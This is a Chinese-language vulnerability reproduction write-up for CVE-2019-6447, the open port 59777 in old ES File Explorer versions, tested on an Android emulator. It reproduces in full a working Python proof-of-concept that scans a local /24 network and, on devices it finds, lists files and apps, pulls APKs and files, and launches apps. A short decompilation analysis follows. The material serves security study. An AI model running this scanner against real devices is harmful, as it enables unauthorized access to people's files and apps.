# CVE-2019-6447 ES文件管理器漏洞复现

> ES文件管理器是一个很常用的文件管理器，主要的利用就是利用了该软件运行之后开启了TCP 59777端口，未关闭导致的可以通过HTTP协议POST请求接受JSON数据，然后可以进行解析执行返回的结构的一个漏洞。

## 环境

- windows10
- IDEA
- JDK 1.8.0_201
- Genymotion安卓模拟器管理
- Google Galaxy Nexus 4.1-API 16的安卓模拟器（用来验证与复现漏洞）
- APKTool（用来分析apk源码）
- ES文件管理器 4.1.9.4版本（这个之前的应该都可以，但是我没有都进行复现）

![1558684567145](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558684567145.png)

- 配置中`ip`地址来源，将模拟器配置安装好之后，命令行输入`adb  devices` 就可以看到`ip`地址了。

## 攻击效果

- 可以获取到同一网段内安卓终端的所有APP信息

![1558685097087](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558685097087.png)

![1558684867659](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558684867659.png)

- 可以在安卓终端打开任意APP

![1558684938285](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558684938285.png)

![1558684979911](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558684979911.png)

- 相当于获取到了一定的权限可以进行很多恶意的操作，是大神`fs0c131y`写的[POC代码](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)

```
import json
import optparse
import requests
import sys
from socket import *

verbose = True

def sanitize_json(json):
    json = json.replace("\'", "\"")
    json = json.split('[')[1].split(']')[0]
    json = json[0:len(json)-6] + "}"
    return json

def get_file(addr, filepath):

    if verbose:
        print('[*] Getting file: ' + filepath + '\n\tfrom: ' + addr)
    session = requests.Session()
    headers = {"Content-Type": "application/json"}
    address = 'http://' + addr + ':59777' + filepath
    filename = filepath.rsplit('/', 1)[1]
    resp = session.get(address, headers=headers, verify=False)

    if verbose:
        print('[*] Server responded with: ' + str(resp.status_code))
    if resp and resp.status_code == 200:
        if verbose:
            print('[*] Writing to file: ' + filename)
        with open(filename, 'wb') as f:
            f.write(resp.content)

def execute_cmd(addr, cmd, package):

    if verbose:
        print('[*] Executing command: ' + cmd + ' on ' + addr)
    session = requests.Session()
    headers = {"Content-Type": "application/json"}
    address = 'http://' + addr + ':59777'

    if package != '':
        data = '{ "command":' + cmd + ', "appPackageName":' + package + ' }'
    else:
        data = '{ "command":' + cmd + ' }'
    resp = session.post(address, headers=headers, data=data, verify=False)

    if verbose:
        print('[*] Server responded with: ' + str(resp.status_code))
    if "NameNotFoundException" in resp.text:
        print('[!] Package \'' + package + '\' not found!')
        return
    if cmd not in ('getDeviceInfo', 'appLaunch', 'listAppsSdcard', 'listVideos', 'listFiles'):
        text = sanitize_json(resp.text)
    else:
        text = resp.text

    if resp and resp.status_code == 200:
        if cmd == 'getAppThumbnail': 
            if verbose:
                print('[*] Getting app thumbnail: ' + package)
            with open(package + ".jpg", 'wb') as f:
                f.write(resp.content)
        elif cmd == 'appPull':
            if verbose:
                print('[*] Pulling app: ' + package)
            with open(package + ".apk", 'wb') as f:
                f.write(resp.content)
        else:
            print(text)

def is_up(addr):
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(1)
    if not s.connect_ex((addr, 59777)):
        s.close()
        return 1
    else:
        s.close()

def show_available_cmds():
    print('')
    print('######################')
    print('# Available Commands #')
    print('######################')
    print('')
    print('listFiles: List all the files')
    print('listPics: List all the pictures')
    print('listVideos: List all the videos')
    print('listAudios: List all the audio files')
    print('listApps: List all the apps installed')
    print('listAppsSystem: List all the system apps')
    print('listAppsPhone: List all the phone apps')
    print('listAppsSdcard: List all the apk files in the sdcard')
    print('listAppsAll: List all the apps installed (system apps included)')
    print('getDeviceInfo: Get device info. Package name parameter is needed')
    print('appPull: Pull an app from the device')
    print('appLaunch: Launch an app. Package name parameter is needed')
    print('getAppThumbnail: Get the icon of an app. Package name parameter is needed')
    print('')


def set_up_menu():
    parser = optparse.OptionParser()
    parser.add_option('-g', '--get-file',action="store", dest="filepath",help="Get file path", default="")
    parser.add_option('-c', '--cmd',action="store", dest="cmd",help="Command to execute", default="")
    parser.add_option('-p', '--pkg',action="store", dest="package",help="Package name", default="")
    parser.add_option('--ip', '--host',action="store", dest="host", help="Target host IP", default="")
    parser.add_option('-n', '--network',action="store", dest="network", help="Network to scan", default="192.168.0.")
    parser.add_option('-v', '--verbose', action="store_true", dest="verb", help="Loud stdout")
    return parser.parse_args()

def main():
    options, _ = set_up_menu()
    verbose = options.verb

    if len(sys.argv) > 1 and sys.argv[1] == 'list':
        show_available_cmds()
    elif options.filepath != '' or options.cmd != '':
        def scan_host(addr):
            if verbose:
                print('[*] Checking address: ' + addr)
            if is_up(addr):
                if verbose:
                    print('[+] Address is up: ' + addr)
                if options.filepath != '':
                    get_file(addr, options.filepath)
                elif options.cmd != '':
                    execute_cmd(addr, options.cmd, options.package)

        if options.host != '':
            scan_host(options.host)
        else:
            for ip in range(0, 255):
                scan_host(options.network + str(ip))
    else:
        print('Usage:')
        print('- python3 poc.py list')
        print('- python3 poc.py --get-file [filepath]')
        print('- python3 poc.py --cmd [cmd]')
        print('- python3 poc.py --cmd [cmd] --host [target_host]')
        print('- python3 poc.py --cmd [cmd] --network [network]')
        print('- python3 poc.py --cmd [cmd] --pkg [package_name]')
        print('- python3 poc.py --verbose --cmd [cmd] --pkg [package_name]')

if __name__ == '__main__':

    main()
```

## 分析过程

- 先将`apk`文件解压，可以看到多个`dex`文件。

  ![1558685931706](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558685931706.png)

- 使用`jadx-gui`逐个打开`dex`文件，进行反编译。

  ![1558686949557](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558686949557.png)

- 使用字符串搜索关键字`command`，看到关键的位置。`\com\estrongs\android\f\a.class` 并且里边可以看到允许很多的`command`命令，例如`listAppsAll`、`getDeviceInfo`等等。

  ![1558687062762](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558687062762.png)

  ![1558687304614](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558687304614.png)

- 以`appLaunch`命令为例分析，如果`cmd`接收到`appLaunch`命令，就会返回`a(jSONObject)`,查看一下`a`函数的源码。

  ![1558687542252](https://github.com/sunSUNQ/Java_learning/raw/master/CVE-2019-6447_ESFileExplorer/image/1558687542252.png)

- 就是将从`json`串中找到`app`的包名，然后直接通过`startActivity`启动程序。

## 总结

由于对于传入的数据没有进行严格的校验产生的问题。修补过后的也是将传入的数据进行了校验，使得攻击者无法执行进一步的恶意操作。





## 参考链接

- [ES文件浏览器 CVE-2019-6447 高危漏洞复现](https://www.52pojie.cn/thread-856993-1-1.html)
